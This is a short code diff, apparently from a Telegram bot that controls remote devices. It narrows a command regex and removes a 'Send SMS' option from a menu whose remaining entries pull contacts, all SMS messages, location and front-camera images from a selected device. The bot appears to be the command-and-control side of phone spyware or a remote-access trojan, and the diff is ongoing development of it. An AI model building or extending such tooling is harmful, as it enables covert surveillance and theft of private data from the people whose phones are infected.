@@ -124,8 +124,8 @@ bot.action(/^select_device_(.+)$/, async (ctx) => {
     return sendCommandMenu(ctx, deviceId, device.name);
 });
 
-// Run a command on the selected device
-bot.action(/^cmd_(\w+)_(.+)$/, async (ctx) => {
+// Run a command on the selected device (excludes smsmode — handled separately below)
+bot.action(/^cmd_(ch|contact|as|loc|cf)_(.+)$/, async (ctx) => {
     const command = ctx.match[1];
     const deviceId = ctx.match[2];
     const device = devices[deviceId];
@@ -139,8 +139,7 @@ bot.action(/^cmd_(\w+)_(.+)$/, async (ctx) => {
         contact: '👥 Contacts',
         as:      '💬 All SMS',
         loc:     '📍 Location',
-        cf:      '📸 Front Camera',
-        ms:      '📤 Send SMS'
+        cf:      '📸 Front Camera'
     };
 
     device.pendingCommand = command;
